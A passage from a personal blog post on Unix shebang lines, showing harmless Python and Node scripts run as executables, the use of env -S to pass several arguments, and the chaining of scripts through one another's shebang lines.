<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">test.py</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Hello from the Python interpreter"</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x test.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./test.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hello from the Python interpreter</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="well-javascript-is-interpreted-too">Well, JavaScript is interpreted too<a href="https://kblagoev.com/blog/on-shebangs-being-funky#well-javascript-is-interpreted-too" class="hash-link" aria-label="Direct link to Well, JavaScript is interpreted too" title="Direct link to Well, JavaScript is interpreted too">​</a></h3>
<p>Oh, how right you are! For some reason it never occured to me before, but since JavaScript is also a non-compiled, interpreted language, we should be able to make any scripts written in JS into executable files by providing a shebang line to it with some JS runtime like <em>node</em> or <em>bun</em>, right?</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">test.js</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token hashbang comment" style="color:#999988;font-style:italic">#!/usr/bin/env node</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Hello from Node, it being a javascript interpreter and all"</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x test.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./test.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hello from Node, it being a javascript interpreter and all</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Yep. That's really cool, if you ask me! Now, technically there is a limitation here. As you've noticed, the shebang line starts with a <em>hash</em> symbol, and there's a good reason for that. The <code>#</code> symbol is used as a comment in many scripting languages, like shell and python, and it has been chosen for exactly that reason - to not break the syntax that the interpreter for shell expects. But in JavaScript <code>#</code> is not a comment. So, technically this would break JS syntax. And as such, it's up to each JS interpreter to implement the ignoring of shebang lines - basically a first line of a script file which starts with <code>#</code> or <code>#!</code> I guess. As such, with languages that don't support <em>hash</em> comments your milage may vary depending on the interpreter implementation. But hey, it works on node!</p>
<p>I leave it as an exercise for the reader to see if your favourite scripting language works with shebang lines :) Odds are, it does - as long as either the language already has <code>#</code> as a comment, or your interpreter has implemented ignoring shebang lines.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="arguments-in-a-shebang-line">Arguments in a shebang line<a href="https://kblagoev.com/blog/on-shebangs-being-funky#arguments-in-a-shebang-line" class="hash-link" aria-label="Direct link to Arguments in a shebang line" title="Direct link to Arguments in a shebang line">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="interpreter-directive-arguments">Interpreter directive arguments<a href="https://kblagoev.com/blog/on-shebangs-being-funky#interpreter-directive-arguments" class="hash-link" aria-label="Direct link to Interpreter directive arguments" title="Direct link to Interpreter directive arguments">​</a></h3>
<p>So, technically the the shebang syntax is defined as <code>#! interpreter [optional-one-arg-only]</code>. This means that the <code>interpreter</code> is actually the first value provided after the magic number <code>#!</code>. So, we could write simply <code>#! /bin/bash</code> and hope that the <em>bash</em> is located at <code>/bin/bash</code>.</p>
<p>But, as we've seen, we actually usually write more so something like <code>#! /usr/bin/env bash</code>, meaning that the "interpreter" is actually <code>/usr/bin/env</code>, and we have an additional optional param called <code>bash</code>. This isn't really what's happening though. What we're saying here, is that we are going to look for <code>bash</code> inside the <code>PATH</code> variable. This helps with the portability of scripts between different OSs, as we can't guarantee that the interpreter will be in the same location on each OS.</p>
<p>But, by doing this, we've also used up all of our 1 available optional arguments we can pass into the shebang line. So, if we need to pass an argument to an interpreter, we are out of luck.</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">arguments_not_working.js</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token hashbang comment" style="color:#999988;font-style:italic">#!/usr/bin/env node -e console.log(\"Running this through the shebang line\")</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we try running this, we would always get an error that saying "No such file or directory"</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x arguments_not_working.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./arguments_not_working.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/env: </span><span class="token string" style="color:#e3116c">'node -e console.log(\\"Running this through the shebang line\\")'</span><span class="token builtin class-name">:</span><span class="token plain"> No such </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> or directory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/env: use -</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">S to pass options </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> shebang lines</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="passing-multiple-arguments-to-the-shebang-line">Passing multiple arguments to the shebang line<a href="https://kblagoev.com/blog/on-shebangs-being-funky#passing-multiple-arguments-to-the-shebang-line" class="hash-link" aria-label="Direct link to Passing multiple arguments to the shebang line" title="Direct link to Passing multiple arguments to the shebang line">​</a></h3>
<p>But hey, what's that thing on the bottom saying? Well, we can actually <a href="https://www.gnu.org/software/coreutils/manual/html_node/env-invocation.html#g_t_002dS_002f_002d_002dsplit_002dstring-usage-in-scripts" target="_blank" rel="noopener noreferrer">pass multiple arguments</a> to the shebang line, using the <code>-S</code> flag! It's not guaranteed to work on every system, so it may reduce portability. But it's still a thing we can try.</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">arguments_working.js</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token hashbang comment" style="color:#999988;font-style:italic">#!/usr/bin/env -S node -e console.log(\""Running\_this\_through\_the\_shebang\_line\"")</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x arguments_working.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./arguments_working.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Running this through the shebang line</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>As you notice that the <a href="https://www.gnu.org/software/coreutils/manual/html_node/env-invocation.html#Escape-sequences" target="_blank" rel="noopener noreferrer">-S escape sequences</a> can be somewhat nightmarish, but in more common scenarios you shouldn't need them that much.</p>
<p>You can also optionally replace the <code>-S</code> argument with <code>-vS</code> if you need to debug the arguments you're passing down to the interpreter.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./arguments_working.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">split</span><span class="token plain"> -S:  </span><span class="token string" style="color:#e3116c">'node -e console.log(\\""Running\\_this\\_through\\_the\\_shebang\\_line\\"")'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> into:    </span><span class="token string" style="color:#e3116c">'node'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">    </span><span class="token string" style="color:#e3116c">'-e'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">    </span><span class="token string" style="color:#e3116c">'console.log("Running this through the shebang line")'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">executing: </span><span class="token function" style="color:#d73a49">node</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   arg</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'node'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   arg</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'-e'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   arg</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'console.log("Running this through the shebang line")'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   arg</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'./arguments_working.js'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Running this through the shebang line</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="nesting-shebang-calls">Nesting shebang calls<a href="https://kblagoev.com/blog/on-shebangs-being-funky#nesting-shebang-calls" class="hash-link" aria-label="Direct link to Nesting shebang calls" title="Direct link to Nesting shebang calls">​</a></h2>
<p>Now, we've been saying that the shebang line is used to specify an interpreter to run the script file. But what's an interpreter? On the highest of levels, it's some <em>binary</em> that can execute scripts in a given language. But for the purposes of the program loader, a binary is just an executable file. And at the start of the article said that we can make script files executable by providing them with a shebang line.</p>
<p>So, what's stopping us from calling <em>any</em> executable file from a shebang line, including files that are only executable because they have their own shebang line? Well, let me answer this clearly rhetorically stated by me question with the laconic "nothing". So, let's test this with a contrived example.</p>
<p>First, we create a JavaScript script with a shebang line.</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token hashbang comment" style="color:#999988;font-style:italic">#! /usr/bin/env node</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Hi from JS"</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Then, let us create a random-ass file with just a shebang line to call our JS script. Do notice the file locations specified.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">sheshotmedown.bangbang</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token shebang important">#! /usr/bin/env -S ${HOME}/code/scripts/js.js</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Aaaand, let's see what we've done.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x sheshotmedown.bangbang js.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./sheshotmedown.bangbang</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi from JS</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Honestly, upon this realisation I just went "Daaaang!". You can basically set up a weird-ass dependency chain this way. Not that you'd want to, probably, but this is still hilariously amusing to me. Let's see if it works with one more layer, but with a local directory call.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">ihittheground.bangbang</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#! ./sheshotmedown.bangbang</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x ihittheground.bangbang</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./ihittheground.bangbang</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi from JS</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Yep, we got it down. We can just call random executable files from within the shebang line.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="and-now-with-arguments">And now with arguments<a href="https://kblagoev.com/blog/on-shebangs-being-funky#and-now-with-arguments" class="hash-link" aria-label="Direct link to And now with arguments" title="Direct link to And now with arguments">​</a></h3>
<p>The last thing I wanted to showcase, is the fact that you keep passing the shebang arguments down the chain of calls. Let's do one final experiment</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">bangbang.js</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token hashbang comment" style="color:#999988;font-style:italic">#! /usr/bin/env -S BANG="He\_wore\_black\_and\_I\_wore\_white" node</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">argv</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">env</span><span class="token punctuation" style="color:#393A34">.</span><span class="token constant" style="color:#36acaa">BANG</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"He would always win the fight"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">mybabyshotmedown.bangbang</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token shebang important">#! /usr/bin/env -S ./thatawfulsound.bangbang "We\_rode\_on\_horses\_made\_of\_sticks"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 